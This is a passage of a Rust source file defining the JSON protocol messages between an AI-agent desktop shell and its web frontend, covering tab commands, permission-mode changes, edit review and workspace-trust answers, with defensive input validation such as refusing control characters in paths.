//! JSON message types and (de)serialization for the Rust<->JS bridge between `shell` and
//! `agent-ui/web`'s embedded frontend, v2 protocol: every
//! JS->Rust command carries a `requestId`; Rust replies with exactly one `command_result` per
//! command, and pushes a revisioned `events`/`snapshot` envelope independently of any specific
//! command. See agent-ui/web/src/types.ts for the exact TS-side shapes these must match.

use std::collections::BTreeMap;

#[cfg(test)]
use agent::AgentSessionProjection;
use agent::{AgentDomainEvent, PermissionMode};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::BTreeSet;

/// A tab's permission mode, Eitri's own (the CLI under it never changes with it). `Manual` is the
/// strictest: Eitri's policy answers every request and cards every file edit; `Auto` lets the
/// policy (or, on a CLI running its own auto mode, the CLI's classifier) decide; `Bypass` answers
/// everything `allow`. Declared in `Shift+Tab`'s order.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SessionModeChoice {
    Manual,
    Auto,
    Bypass,
}

impl From<SessionModeChoice> for PermissionMode {
    fn from(choice: SessionModeChoice) -> Self {
        match choice {
            SessionModeChoice::Manual => PermissionMode::Manual,
            SessionModeChoice::Auto => PermissionMode::Auto,
            SessionModeChoice::Bypass => PermissionMode::Bypass,
        }
    }
}

impl SessionModeChoice {
    pub fn as_str(self) -> &'static str {
        match self {
            SessionModeChoice::Manual => "manual",
            SessionModeChoice::Auto => "auto",
            SessionModeChoice::Bypass => "bypass",
        }
    }

    pub fn parse(text: &str) -> Option<Self> {
        match text {
            "manual" => Some(SessionModeChoice::Manual),
            "auto" => Some(SessionModeChoice::Auto),
            "bypass" => Some(SessionModeChoice::Bypass),
            _ => None,
        }
    }

    /// The next of `offered` (in order), wrapping; a mode not in `offered` goes to the first one it
    /// can parse. **Not what `Shift+Tab` does:** `TabSet::cycle_mode`/`cycle_default_mode` switch on
    /// the mode explicitly, because entering bypass is never a plain step (it asks first) and an
    /// agent that offers no manual mode skips it. `agent_prefs::startup_mode` does not call this
    /// either (new tabs start in Auto, not in the first offered mode) -- this function has no
    /// production caller left; it is kept for its own tests, below.
    pub fn cycled(self, offered: &[&str]) -> Self {
        let modes: Vec<Self> = offered.iter().filter_map(|m| Self::parse(m)).collect();
        match modes.iter().position(|m| *m == self) {
            Some(at) => modes[(at + 1) % modes.len()],
            None => modes.first().copied().unwrap_or(self),
        }
    }
}

/// The page's mode mirror: what the page currently is, for the `Ctrl+j`/`Ctrl+k` decision this
/// module makes in Rust. `Browse` is a live tab's BROWSE (or the dashboard menu), with no overlay
/// open and a box that can take INPUT; `Input` is the live composer (or the dashboard's), with no
/// overlay open; `Other` is everything else -- an overlay open, an ended/starting/failed tab, and so
/// on. The page posts a `panel_keys` message whenever the effective mode changes (and once after
/// `ready`); `shell` keeps only the most recent value, starting (and resetting to) `Other` on every
/// `ready` so a stale mirror from a torn-down document is never trusted across a reload.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PanelKeys {
    Browse,
    Input,
    Other,
}

/// The `Ctrl+j`/`Ctrl+k` direction: `Down` is `Ctrl+j` (BROWSE -> INPUT), `Up` is
/// `Ctrl+k` (INPUT -> BROWSE). Only these two travel through this mechanism -- `Ctrl+h`/`Ctrl+l`
/// never do.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum NavKeyDirection {
    Down,
    Up,
}

/// `Ctrl+w h/j/k/l`'s side: which way the keys leave the panel, by
/// geometry -- `h` left, `j` down, `k` up, `l` right, vim's own letters. Not [`NavKeyDirection`], which
/// is `Ctrl+j`/`Ctrl+k`'s two-valued mirror of BROWSE and INPUT and must stay two-valued. The wire
/// words are the side's names, never the letters, so a direction is read the same by both halves.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PaneNavDirection {
    Left,
    Down,
    Up,
    Right,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum InboundMessage {
    Ready {
        request_id: String,
    },
    SendMessage {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        text: String,
    },
    Interrupt {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
    },
    /// The confirmed `<leader>k`: stop what the tab's agent left running after its turns ended.
    /// Claude stops individual tasks; Codex stops its session. `running` is the count the question showed: an answer to a
    /// question about another count stops nothing (`TabSet::stop_background`).
    StopBackground {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        running: u32,
    },
    ToggleFollowing {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
    },
    StopTask {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        task_id: String,
    },
    TaskOutput {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        task_id: String,
        /// Where to start reading the whole output; absent reads the last bytes.
        #[serde(default)]
        offset: Option<u64>,
    },
    /// The models the session's CLI offers, for the picker. No turn.
    ListModels {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
    },
    /// A change of the running session's model, also during a turn.
    SetModel {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        model: String,
    },
    /// A change of the running session's effort, also during a turn. Empty goes back to the settings.
    ApplyEffort {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        effort: String,
    },
    /// The WebView reporting how long it took to draw the first assistant text of a turn, measured
    /// from its own receipt of the payload to the animation frame that rendered it.
    ///
    /// A SPAN, not an instant: JS `performance.now()` and Rust `Instant` have unrelated epochs, so a
    /// timestamp crossing this boundary would be a confident, meaningless number. Diagnostic only --
    /// nothing branches on it, and it gets no `command_result`.
    TurnRendered {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        receive_to_frame_ms: f64,
    },
    /// "Continue this conversation in a real terminal." Carries nothing of its own: every input the
    /// rule needs already lives in canonical state on the Rust side, and a session id sent from the
    /// frontend would be a second, stale source for the one value that must not be wrong.
    ///
    /// Closes the session before the command is produced -- see `crate::terminal_handoff` for what
    /// this path does and does not claim, and `agent_panel`'s `PendingHandoff` for the ordering.
    HandoffToTerminal {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
    },
    PermissionResponse {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        permission_id: String,
        decision: DecisionChoice,
        /// Only meaningful on a denial -- there is no field anywhere downstream that would show an
        /// approval's reason to the model. Carried flat rather than inside the variant because
        /// `InboundMessage` is already internally tagged on `type`.
        #[serde(default)]
        reason: Option<String>,
        /// The card's third button: allow, and save the rule Rust offered for this permission id
        /// (`rule_offers`). The rule itself is never taken from the panel, so a page cannot save a
        /// rule broader than the one it was shown.
        #[serde(default)]
        remember: bool,
    },
    /// A person's answer to a card of the tool broker, by the card's own id. Gated exactly as a card answer. It
    /// carries no reason and no rule, since a broker card offers neither, and goes to the broker, not to a
    /// provider. A `decision` or an `origin` outside its closed set does not parse.
    EditorCardAnswer {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        card_id: String,
        decision: DecisionChoice,
        origin: CardOriginChoice,
    },
    /// The question dock's submit: the person's answers to Claude's question set `interaction_id`, by
    /// option index and typed text, never as the answer's words (the sidecar builds those from the
    /// question it kept). Gated exactly as a card answer. A malformed answer does not parse.
    QuestionAnswer {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        interaction_id: String,
        answers: Vec<QuestionAnswerWire>,
    },
    /// The question dock's Escape (`cancel`) or "Chat about this" (`chat`, with what was answered so
    /// far). Gated exactly as a card answer. An unknown `kind` does not parse.
    QuestionDecline {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        interaction_id: String,
        kind: QuestionDeclineChoice,
        #[serde(default)]
        so_far: Vec<QuestionAnswerWire>,
    },
    /// `resume{tab, provider_session_id}` carries the Claude provider session id to continue on the
    /// tab the user was in. `start_session` is removed: a fresh session
    /// on a `NotStarted` tab now starts lazily off `send_message` rather than an explicit message.
    Resume {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        provider_session_id: String,
    },
    /// The tab bar: `n`/`p`/a digit, or a click on a tab's label.
    SelectTab {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
    },
    /// `prefix ,`: commits the inline rename field's text.
    RenameTab {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        name: String,
    },
    /// Sent after the panel's own y/n close confirmation.
    CloseTab {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
    },
    /// `r` on an ended or failed tab: returns it to `NotStarted` in place.
    ResetTab {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
    },
    /// `Shift+Tab`/`<leader>m` on any tab: cycles it manual -> auto -> bypass -> manual, Claude
    /// Code's order (auto <-> bypass on a tab whose agent offers no manual mode). Entering bypass
    /// always asks first (`ModeCycle::Confirm`, answered by `confirm_bypass`); every other step is
    /// immediate (`TabSet::cycle_mode`).
    CycleMode {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
    },
    /// `Enter` on the status row (`prefix i` is `shell`'s own): opens the detail popover.
    OpenDetail {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
    },
    /// `Enter` while a turn runs: composed with the editor context of this moment, then put into the running
    /// turn when the tab's agent can take it (`TabSet::steer_held`), held for the turn's end otherwise.
    QueueMessage {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        text: String,
        /// The turn the page showed running when Enter was pressed: the message goes only into that one.
        #[serde(default)]
        turn_id: Option<String>,
    },
    /// `↑` on the box's first line with a queue: the whole queue back, as `queue_taken`.
    TakeBackQueue {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
    },
    /// `Ctrl+Enter` (Claude Code's `chat:sendNow`): interrupt if running, then the queue plus `text`.
    SendNow {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        text: String,
    },
    /// The box's text, mirrored 300 ms after the last change, not on every key. No `command_result`.
    Draft {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        text: String,
    },
    /// `Ctrl+g` in INPUT: edit `text` in an nvim scratch buffer; `:wq` returns it.
    EditDraft {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        text: String,
    },
    /// A question form mirror; it never submits an answer.
    QuestionDraft {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        interaction_id: String,
        draft: Value,
    },
    /// Edit a question's free text through the existing scratch route.
    EditQuestionOther {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        interaction_id: String,
        question_index: u32,
        text: String,
    },
    /// `Ctrl+c` on an idle draft: the text goes to history so `↑` recalls it.
    HistoryPush {
        request_id: String,
        text: String,
    },
    /// `gf` or a click on a path.
    OpenPath {
        request_id: String,
        path: String,
        #[serde(default)]
        line: Option<u32>,
    },
    /// `c` in BROWSE: the files that changed on disk during a turn of this tab's session, or during
    /// the whole session. Answered by a `review` envelope carrying `request_id`, or by a failing
    /// `command_result`; a success has no `command_result` of its own.
    ReviewRequest {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        turn: ReviewTurnWire,
        scope: ReviewScopeWire,
    },
    /// One file of a review, opened: its hunks. Answered by a `review_diff` envelope carrying
    /// `request_id`, or by a failing `command_result`.
    ReviewDiffRequest {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        turn: u32,
        scope: ReviewScopeWire,
        path: String,
    },
    /// `x` in the review overlay: put a hunk, or the whole file, back to how the turn found it.
    /// Answered by a `command_result`.
    ReviewRevert {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        turn: u32,
        scope: ReviewScopeWire,
        path: String,
        target: ReviewRevertTargetWire,
    },
    /// `u` in the review overlay: undo the newest revert made there.
    ReviewUndo {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
    },
    /// `i` in the review overlay: add a comment on lines of a file to the tab's draft. Answered by a
    /// `review_draft` envelope carrying `request_id`, or by a failing `command_result`.
    ReviewCommentAdd {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        turn: u32,
        scope: ReviewScopeWire,
        path: String,
        from: u32,
        to: u32,
        text: String,
    },
    /// Remove one comment from the tab's draft. Answered like `review_comment_add`.
    ReviewCommentRemove {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        id: u32,
    },
    /// `s` in the review overlay: without `confirm`, a preview of the message; with the digest the
    /// preview showed, send it. The only way a review reaches the agent.
    ReviewSend {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        #[serde(default)]
        confirm: Option<String>,
    },
    /// Answer the question about a write that did not finish (restore it, or let it go). Window-level:
    /// the journal belongs to the project, not to a tab.
    ReviewRecover {
        request_id: String,
        entry: String,
        answer: ReviewRecoverAnswerWire,
    },
    /// Show a file's turn changes in the user's editor.
    OpenInEditor {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        turn: u32,
        scope: ReviewScopeWire,
        path: String,
        #[serde(default)]
        line: Option<u32>,
    },
    /// `Ctrl+g` in BROWSE: the row's full text in a read-only scratch buffer.
    ViewInEditor {
        request_id: String,
        title: String,
        text: String,
    },
    /// `Ctrl+g` in BROWSE on a pending edit card whose change names one file: the file as it is on disk
    /// beside the file as the card would leave it, both read-only. `path` is the agent's own, relative to
    /// the project or absolute; nothing about it is trusted.
    ViewProposal {
        request_id: String,
        path: String,
        change: ProposedChange,
    },
    /// `Ctrl+g` in BROWSE on the card of a proposal an editor tool computed: file number `file` of
    /// proposal `proposal` of this tab, as the review store holds its two sides, in the read-only diff
    /// tab. The page names the proposal and the file; the texts never come from it.
    EditorCardView {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        proposal: String,
        file: u32,
    },
    /// `f` in the panel's BROWSE: ask `shell` to start a global HINT.
    HintRequest {
        request_id: String,
    },
    /// The panel's answer to `hint_collect`: how many visible targets it froze for `session_id`.
    HintTargets {
        request_id: String,
        session_id: u64,
        count: usize,
    },
    /// `prefix` + one of tmux's window keys, or `<leader>bo`'s panel binding, once `keymap.ts`
    /// resolves a verb. Window-level: `shell` runs it through the very code the
    /// prefix's own `Action::Tab` arm runs -- whichever tab is under it decides, not one this
    /// message names, which is why no `tab` field travels with it.
    TabVerb {
        request_id: String,
        verb: TabVerbWire,
        /// Only `new` reads it: the agent word `:tabnew <agent>` typed. Absent is the new-tab key's own
        /// tab, which runs the window's default agent.
        #[serde(default)]
        agent: Option<String>,
    },
    /// `Shift+Tab` on the chooser's `New session` row or a record: the same cycle as
    /// `CycleMode`, applied to `TabSet::default_mode` (the window's remembered default for new tabs)
    /// rather than any one tab's own `mode` -- `cycle_mode{tab}` cycles any tab's mode, live or
    /// empty, not only a `NotStarted` one. Window-level for the same reason `TabVerb` is.
    CycleDefaultMode {
        request_id: String,
    },
    /// Sent after `confirm_close_others`'s y/n is answered `y`: the same close path as `CloseTab`,
    /// run once per tab (`tabs::close_others`).
    /// Window-level and carries no tab list of its own -- like `TabVerb`, whichever tabs are still
    /// "every tab but the active one" by the time this arrives decides, recomputed fresh rather
    /// than trusting a set the user could have changed while the prompt was open.
    CloseOthers {
        request_id: String,
    },
    /// The page's mode mirror, posted whenever the page's effective mode changes and once after
    /// `ready`. See [`PanelKeys`]'s own doc.
    PanelKeys {
        request_id: String,
        mode: PanelKeys,
    },
    /// The mode mirror's stale-state recovery: a `nav_key` the page could not apply against its own
    /// current state. `shell` runs `move_focus(agent, direction)`, i.e. exactly what the chord would
    /// have done had the panel never intercepted it.
    NavFallthrough {
        request_id: String,
        direction: NavKeyDirection,
    },
    /// Ctrl+w h/j/k/l in BROWSE: move the keys from the panel that way, by geometry.
    PaneNav {
        request_id: String,
        direction: PaneNavDirection,
    },
    /// The `?` overlay that `prefix ?` opened was closed. `opening` is the number `open_keymap` carried, so a close
    /// that arrives after a newer `prefix ?` can be told apart; `return_keys` is true only for the overlay's own
    /// keys or a click outside it. Both are required: a message without either is malformed, never "close, no
    /// return".
    KeymapClosed {
        request_id: String,
        opening: u64,
        return_keys: bool,
    },
    /// The answer to `view_export`: the page's own view of the tab a move takes (its cursor, mode, expanded
    /// blocks, scroll anchor), or `null` when it holds none. `request` is the number `view_export` carried;
    /// the view is the page's, passed on to the other window's page unread.
    ViewExported {
        request_id: String,
        request: u64,
        #[serde(default)]
        view: Option<serde_json::Value>,
    },
    /// gx: open this web link in the system browser. The page sends the WHATWG-normalized address
    /// (`agent-ui/web/src/nav.ts#webUrl`); `shell` re-checks it (`panel/src/links.rs#web_url`) before it
    /// reaches `gtk4::UriLauncher`. No `serde(default)`: a message with no address is malformed, never "open
    /// nothing".
    OpenUrl {
        request_id: String,
        url: String,
    },
    /// `s` on the launch dashboard: bring back the tabs the last window had open, the first into
    /// this empty tab and the rest into new ones. Names the tab it was pressed in.
    RestoreLast {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
    },
    /// `y` (`keep_bypass`) or `n` to the question a restore asked because a saved tab was in bypass.
    /// Window-level, like `ConfirmBypass`; the nonce is the one the question was shown with, and has
    /// no default for the same reason: only the exact prompt shown may be answered.
    RestoreAnswer {
        request_id: String,
        nonce: u64,
        keep_bypass: bool,
    },
    /// `y`/`Y` to a `confirm_bypass` prompt: the panel's own answer, guarded by its
    /// typed-input rules, naming the tab (or `null` for the window default) and the nonce
    /// it was shown so a stale prompt can never answer a newer one. Window-level for routing
    /// (`tab_ref` -> `WindowLevel`): it names its own tab in `tab`/`scope`, the same shape `TabVerb`
    /// already uses, rather than being addressed to "the active tab".
    ConfirmBypass {
        request_id: String,
        #[serde(default)]
        tab: Option<u64>,
        scope: BypassScopeWire,
        // No `#[serde(default)]`: a `confirm_bypass` with no nonce is a protocol error (a client
        // that does not know which prompt it is answering), never "the current one" -- the nonce's whole
        // point is that only the exact prompt shown may be answered.
        nonce: u64,
    },
    /// `y` or `n` to the workspace-trust question of one tab. The page echoes the prompt's
    /// `fingerprint` and `findingsDigest` verbatim, so what is answered is exactly what was shown;
    /// none of `tab`, `nonce`, `fingerprint` or `findings_digest` has a default, because an answer
    /// that does not say which prompt it answers is a protocol error, never "the current one".
    TrustAnswer {
        request_id: String,
        tab: u64,
        nonce: u64,
        fingerprint: String,
        findings_digest: String,
        trust: bool,
    },
    /// `Escape` on the trust question: the start it was holding is put off.
    TrustCancel {
        request_id: String,
        tab: u64,
        nonce: u64,
    },
    /// `:trust` / `:untrust`. Window-level: the root is the window's, not a tab's. `agent` is the
    /// agent of the tab on screen when it was typed (`TabView::agent`): the trust it changes is that
    /// agent's, and one typed for another agent than the active tab now runs is refused.
    TrustCommand {
        request_id: String,
        action: TrustAction,
        agent: String,
    },
}

/// What a `trust_command` asks for.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TrustAction {
    Trust,
    Untrust,
}

/// The wire spelling of `crate::tab_set::BypassScope`. Kept separate from that type (rather than
/// deriving `Deserialize` on it directly) because the wire is JS's vocabulary and the core type is
/// Rust's; see `scope` for the one place they meet.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum BypassScopeWire {
    Tab,
    Default,
}

impl BypassScopeWire {
    /// Pairs the wire scope with the `tab` field `ConfirmBypass` carries into a real
    /// `tab_set::BypassScope`. `(Tab, Some)` and `(Default, None)` are the only combinations a
    /// well-formed client sends; the other two are a protocol error, not a guess at which one was
    /// meant.
    pub fn scope(self, tab: Option<u64>) -> Result<crate::tab_set::BypassScope, String> {
        match (self, tab) {
            (BypassScopeWire::Tab, Some(id)) => Ok(crate::tab_set::BypassScope::Tab(crate::tabs::TabId(id))),
            (BypassScopeWire::Default, None) => Ok(crate::tab_set::BypassScope::Default),
            (BypassScopeWire::Tab, None) => Err("protocol: confirm_bypass scope \"tab\" with no tab".to_string()),
            (BypassScopeWire::Default, Some(_)) => {
                Err("protocol: confirm_bypass scope \"default\" names a tab".to_string())
            }
        }
    }
}

/// A `tab_verb` message's payload: the same actions the prefix's own `Action::Tab` arm
/// runs, minus `Select`/`Rename` (those travel as `SelectTab`/`RenameTab`, which already carry the
/// number or the text a verb alone cannot). `close_others` is here so `<leader>bo` travels the
/// same way `close` carries `<leader>bd`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TabVerbWire {
    Next,
    Prev,
    Last,
    New,
    Close,
    CloseOthers,
    Choose,
    Info,
}

/// Which tab a command is about.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TabRef {
    /// A message about the whole panel (`ready`, the HINT pair).
    WindowLevel,
    /// A tab command that names none: a protocol error, never "the active one", which may have
    /// changed by the time the command arrives.
    Missing,
    Named(crate::tabs::TabId),
}

impl InboundMessage {
    pub fn tab_ref(&self) -> TabRef {
        let tab = match self {
            InboundMessage::Ready { .. }
            | InboundMessage::HintRequest { .. }
            | InboundMessage::HintTargets { .. }
            | InboundMessage::HistoryPush { .. }
            | InboundMessage::OpenPath { .. }
            | InboundMessage::ViewInEditor { .. }
            | InboundMessage::ViewProposal { .. }
            | InboundMessage::TabVerb { .. }
            | InboundMessage::CycleDefaultMode { .. }
            | InboundMessage::CloseOthers { .. }
            // `ConfirmBypass` names its own tab in `scope`/`tab` (`BypassScopeWire::scope`), the
            // same reason `TabVerb` is window-level rather than routed by this generic mechanism.
            | InboundMessage::ConfirmBypass { .. }
            | InboundMessage::RestoreAnswer { .. }
            | InboundMessage::PanelKeys { .. }
            | InboundMessage::NavFallthrough { .. }
            | InboundMessage::PaneNav { .. }
            | InboundMessage::KeymapClosed { .. }
            | InboundMessage::ViewExported { .. }
            | InboundMessage::ReviewRecover { .. }
            | InboundMessage::TrustCommand { .. }
            | InboundMessage::OpenUrl { .. } => return TabRef::WindowLevel,
            // These two name their tab as a plain number: a message without one does not parse.
            InboundMessage::TrustAnswer { tab, .. } | InboundMessage::TrustCancel { tab, .. } => Some(*tab),
            InboundMessage::SendMessage { tab, .. }
            | InboundMessage::Interrupt { tab, .. }
            | InboundMessage::StopBackground { tab, .. }
            | InboundMessage::ToggleFollowing { tab, .. }
            | InboundMessage::StopTask { tab, .. }
            | InboundMessage::TaskOutput { tab, .. }
            | InboundMessage::ListModels { tab, .. }
            | InboundMessage::SetModel { tab, .. }
            | InboundMessage::ApplyEffort { tab, .. }
            | InboundMessage::TurnRendered { tab, .. }
            | InboundMessage::HandoffToTerminal { tab, .. }
            | InboundMessage::PermissionResponse { tab, .. }
            | InboundMessage::EditorCardAnswer { tab, .. }
            | InboundMessage::EditorCardView { tab, .. }
            | InboundMessage::QuestionAnswer { tab, .. }
            | InboundMessage::QuestionDecline { tab, .. }
            | InboundMessage::Resume { tab, .. }
            | InboundMessage::RestoreLast { tab, .. }
            | InboundMessage::SelectTab { tab, .. }
            | InboundMessage::RenameTab { tab, .. }
            | InboundMessage::CloseTab { tab, .. }
            | InboundMessage::ResetTab { tab, .. }
            | InboundMessage::CycleMode { tab, .. }
            | InboundMessage::OpenDetail { tab, .. }
            | InboundMessage::QueueMessage { tab, .. }
            | InboundMessage::TakeBackQueue { tab, .. }
            | InboundMessage::SendNow { tab, .. }
            | InboundMessage::Draft { tab, .. }
            | InboundMessage::EditDraft { tab, .. }
            | InboundMessage::QuestionDraft { tab, .. }
            | InboundMessage::EditQuestionOther { tab, .. }
            | InboundMessage::ReviewRequest { tab, .. }
            | InboundMessage::ReviewDiffRequest { tab, .. }
            | InboundMessage::ReviewRevert { tab, .. }
            | InboundMessage::ReviewUndo { tab, .. }
            | InboundMessage::ReviewCommentAdd { tab, .. }
            | InboundMessage::ReviewCommentRemove { tab, .. }
            | InboundMessage::ReviewSend { tab, .. }
            | InboundMessage::OpenInEditor { tab, .. } => *tab,
        };
        match tab {
            Some(id) => TabRef::Named(crate::tabs::TabId(id)),
            None => TabRef::Missing,
        }
    }
}

/// What a pending edit card would do to its one file, as the page read it off the card: replacements made
/// in order on the file's current text, or the file's whole new content. The page's `ProposedChange`
/// (`agent-ui/web/src/proposal.ts`) is the other half of this shape.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum ProposedChange {
    Edits {
        edits: Vec<ProposedEdit>,
        /// The agent's edit tool reads a CR-LF file with its line ends made LF, replaces there, and writes
        /// the file's line end back over every line (Claude Code's `Edit` and `MultiEdit` do). Absent reads
        /// as false: the replacements are made on the bytes as they are.
        #[serde(default, rename = "crlfAsLf")]
        crlf_as_lf: bool,
    },
    Content {
        content: String,
    },
}

/// One replacement of a [`ProposedChange::Edits`]: `old_text` must be found in the text as the earlier
/// replacements left it, exactly once unless `replace_all`.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ProposedEdit {
    pub old_text: String,
    pub new_text: String,
    pub replace_all: bool,
}

/// Whether a path a page sent holds a control character: C0, DEL and C1, the bidirectional controls, or a line or
/// paragraph separator. Such a path is refused before it is looked up or handed to the editor: a newline in a name has
/// been able to end one editor command and start another, a C1 control is a terminal's escape, a bidirectional control
/// makes a name read as another, and no file name an agent shows needs one.
pub fn path_holds_control(path: &str) -> bool {
    path.chars().any(|c| {
        c.is_control()
            || matches!(
                c,
                '\u{61c}' | '\u{200e}' | '\u{200f}' | '\u{2028}' | '\u{2029}' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}'
            )
    })
}

/// One question's answer in a `question_answer` or a chat `question_decline`. Every field is named on
/// the wire and no other is taken, so a malformed answer is a parse failure, never a default.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct QuestionAnswerWire {
    pub question_index: u32,
    pub option_indexes: Vec<u32>,
    #[serde(default)]
    pub other_text: Option<String>,
    #[serde(default)]
    pub notes: Option<String>,
}

impl QuestionAnswerWire {
    pub fn into_answer(self) -> agent::QuestionAnswer {
        let QuestionAnswerWire {
            question_index,
            option_indexes,
            other_text,
            notes,
        } = self;
        agent::QuestionAnswer {
            question_index,
            option_indexes,
            other_text,
            notes,
        }
    }
}

/// How a `question_decline` turns the set down, as a closed set: an unknown kind is a parse failure.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum QuestionDeclineChoice {
    Cancel,
    Chat,
}

impl QuestionDeclineChoice {
    pub fn kind(self) -> agent::QuestionDeclineKind {
        match self {
            QuestionDeclineChoice::Cancel => agent::QuestionDeclineKind::Cancel,
            QuestionDeclineChoice::Chat => agent::QuestionDeclineKind::Chat,
        }
    }
}

/// How an `editor_card_answer` was given, as a closed set: an unknown word is a parse failure.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CardOriginChoice {
    Key,
    Click,
}

impl CardOriginChoice {
    pub fn origin(self) -> crate::editor_tools::cards::CardOrigin {
        match self {
            CardOriginChoice::Key => crate::editor_tools::cards::CardOrigin::Key,
            CardOriginChoice::Click => crate::editor_tools::cards::CardOrigin::Click,
        }
    }
}

/// The decision half of a `permission_response`, as a closed set rather than a bool.
///
/// Typed on the wire so an unrecognized value is a PARSE failure, not a value some later `match`
/// has to give a default to. The dangerous default here is obvious and one-directional: anything
/// that is not clearly a denial must never end up running the tool.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum DecisionChoice {
    Allow,
    Deny,
}

impl DecisionChoice {
    /// The choice as a broker card takes it: a card has no reason to carry.
    pub fn card_decision(self) -> crate::editor_tools::cards::CardDecision {
        match self {
            DecisionChoice::Allow => crate::editor_tools::cards::CardDecision::Allow,
            DecisionChoice::Deny => crate::editor_tools::cards::CardDecision::Deny,
        }
    }

    /// Pairs the choice with its reason into the typed decision the backends take. An empty or
    /// whitespace-only reason becomes `None`: sending the model an empty string as its explanation
    /// is worse than sending it nothing.
    pub fn into_decision(self, reason: Option<String>) -> agent::PermissionDecision {
        match self {
            DecisionChoice::Allow => agent::PermissionDecision::Allow,
            DecisionChoice::Deny => agent::PermissionDecision::Deny {
                reason: reason.filter(|r| !r.trim().is_empty()),
            },
        }
    }
}

impl InboundMessage {
    pub fn request_id(&self) -> &str {
        match self {
            InboundMessage::Ready { request_id }
            | InboundMessage::SendMessage { request_id, .. }
            | InboundMessage::Interrupt { request_id, .. }
            | InboundMessage::StopBackground { request_id, .. }
            | InboundMessage::ToggleFollowing { request_id, .. }
            | InboundMessage::StopTask { request_id, .. }
            | InboundMessage::TaskOutput { request_id, .. }
            | InboundMessage::ListModels { request_id, .. }
            | InboundMessage::SetModel { request_id, .. }
            | InboundMessage::ApplyEffort { request_id, .. }
            | InboundMessage::TurnRendered { request_id, .. }
            | InboundMessage::HandoffToTerminal { request_id, .. }
            | InboundMessage::PermissionResponse { request_id, .. }
            | InboundMessage::EditorCardAnswer { request_id, .. }
            | InboundMessage::EditorCardView { request_id, .. }
            | InboundMessage::QuestionAnswer { request_id, .. }
            | InboundMessage::QuestionDecline { request_id, .. }
            | InboundMessage::Resume { request_id, .. }
            | InboundMessage::SelectTab { request_id, .. }
            | InboundMessage::RenameTab { request_id, .. }
            | InboundMessage::CloseTab { request_id, .. }
            | InboundMessage::ResetTab { request_id, .. }
            | InboundMessage::CycleMode { request_id, .. }
            | InboundMessage::OpenDetail { request_id, .. }
            | InboundMessage::HintRequest { request_id }
            | InboundMessage::HintTargets { request_id, .. }
            | InboundMessage::QueueMessage { request_id, .. }
            | InboundMessage::TakeBackQueue { request_id, .. }
            | InboundMessage::SendNow { request_id, .. }
            | InboundMessage::Draft { request_id, .. }
            | InboundMessage::EditDraft { request_id, .. }
            | InboundMessage::QuestionDraft { request_id, .. }
            | InboundMessage::EditQuestionOther { request_id, .. }
